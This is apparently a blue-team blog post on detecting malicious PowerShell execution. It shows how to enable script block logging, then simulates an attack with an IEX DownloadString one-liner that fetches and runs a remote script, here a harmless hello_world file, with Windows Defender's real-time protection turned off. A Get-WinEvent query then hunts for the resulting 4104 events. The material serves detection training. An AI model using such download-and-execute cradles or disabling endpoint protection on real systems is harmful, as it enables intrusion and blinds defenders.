---
title: Detecting Malicious Script Execution in PowerShell
date: 2024-05-23 07:00:00 -0600
categories: [blueteam, simulation]
tags: [hunting, difficulty:low, dev]
image:
  path: https://github.com/lr2t9iz/lr2t9iz.github.io/assets/46981088/3d7c8a9b-d0d6-4a44-9078-b62956a3ac16
---

PowerShell, a powerful Windows command-line shell and scripting language, is often abused by adversaries to execute malicious scripts and commands, one of the most commonly used techniques according to [redcanary](https://redcanary.com/threat-detection-report/techniques/). 

We will explore how attackers leverage PowerShell's capabilities to carry out their intrusions, such as those seen in recent REF4578 intrusions revealed by [Elastic Security Labs](https://www.elastic.co/security-labs/invisible-miners-unveiling-ghostengine) and [Antiy](https://www.antiy.com/response/HideShoveling.html). 
  
![image](https://github.com/lr2t9iz/lr2t9iz.github.io/assets/46981088/260b397b-dcba-45d8-bd7b-41347601c406){: .w-75 }
_[@elasticseclabs](https://x.com/elasticseclabs/status/1792932108073132451)_

## Execution in PowerShell
[T1059.001: PowerShell](https://attack.mitre.org/techniques/T1059/001/), This technique is post-exploitation, meaning that the attacker already has access to a machine and will execute their scripts, similar to the approach used in GhostEngine mining attacks.

![image](https://www.elastic.co/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Finvisible-miners-unveiling-ghostengine%2Fimage10.png&w=1920&q=100){: .w-75 }
_Source: Elastic Security Labs **Download and Excecute a PowerShell Script**_

## Detection
Enabling PowerShell logging is crucial for effective detection of malicious activities. By default, Windows has PowerShell logging disabled, which can hinder our ability to monitor and respond to threats. By configuring detailed logging, we can capture information about every script block, module, and command executed in PowerShell.
- Open a PowerShell as **Administrator** and run the following commands
```powershell
$basePath = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
if (-not (Test-Path $basePath)) { $null = New-Item $basePath -Force }
Set-ItemProperty $basePath -Name EnableScriptBlockLogging -Value "1"
```

## Simulation
For the simulation, we will execute a command line in Cmd to observe how it is logged and detected in lab host. To ensure the commands are executed without interference, we will temporarily disable Windows Defender's real-time protection for testing purposes. This will help us understand the logging process and identify key indicators of potentially malicious activity.
```batch
powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/lr2t9iz/PowershellScriptsHub/main/hello_world.ps1');"
```
- Output
![image](https://github.com/lr2t9iz/lr2t9iz.github.io/assets/46981088/9ae2ba5a-4234-4957-a83f-51cdaf6718c9)

## Hunting
To hunt for malicious script execution, we will use the following PowerShell command to query the event logs.
```powershell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" `
-FilterXPath '*[System[EventID=4104]]' `
| Where-Object {$_.ToXml().Contains("hello_world")} | fl
```
- Result
![image](https://github.com/lr2t9iz/lr2t9iz.github.io/assets/46981088/047213b9-e246-4ad8-9e58-a9db21f0173b)
